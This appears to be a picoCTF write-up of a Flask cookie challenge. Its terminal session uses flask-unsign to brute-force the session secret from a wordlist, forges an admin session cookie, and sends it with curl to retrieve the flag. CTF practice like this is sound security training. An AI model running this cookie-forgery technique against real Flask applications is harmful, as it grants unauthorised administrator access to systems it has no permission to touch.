#### Descripción 
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!http://wily-courier.picoctf.net:56273/
#### Solución
```
┌──(kali㉿kali)-[~]
└─$ nano cookie.txt
                                                                             
┌──(kali㉿kali)-[~]
└─$ source ~/.venv/bin/activate        
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.aavj1w.K7DTToO2kQsLvv0hqzVkAYU3wuE" --wordlist cookie.txt
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'thumbprint'
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ 
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret"thumbprint"
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]]
                    [--secret SECRET] [--salt SALT] [--wordlist WORDLIST]
                    [--threads THREADS] [--no-literal-eval]
                    [--server SERVER] [--insecure] [-o OUTPUT] [-p PROXY]
                    [--cookie-name COOKIE_NAME] [-U USER_AGENT] [-q]
                    [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: --secretthumbprint
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "thumbprint"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aavlcw.6HxvXuVP73tRPmpjvkk-u-2HtnM
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ curl -s http://wily-courier.picoctf.net:56273/ -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aavlcw.6HxvXuVP73tRPmpjvkk-u-2HtnM" | grep pico 
                                                                             
┌──(.venv)─(kali㉿kali)-[~]
└─$ curl -s http://wily-courier.picoctf.net:56273/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.aavlcw.6HxvXuVP73tRPmpjvkk-u-2HtnM" | grep pico 
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{cO0ki3s_yum_e45c084f}</code></p>
                                                                             
┌──(.venv)─(kali㉿kali)-[~]


```
#### Notas
utilizamos una herramienta llamada flask unsign para con ayuda de la llave y palabras guardadas es el código como válidas supieramos la palabra válida para nuestro caso, con eso ingresamos al código de la respuesta a esa cookie que nos asignaron y con un grep descartamos el contenido del codigo y vemos solo la llave escondida en dicho código.
#### Referencias


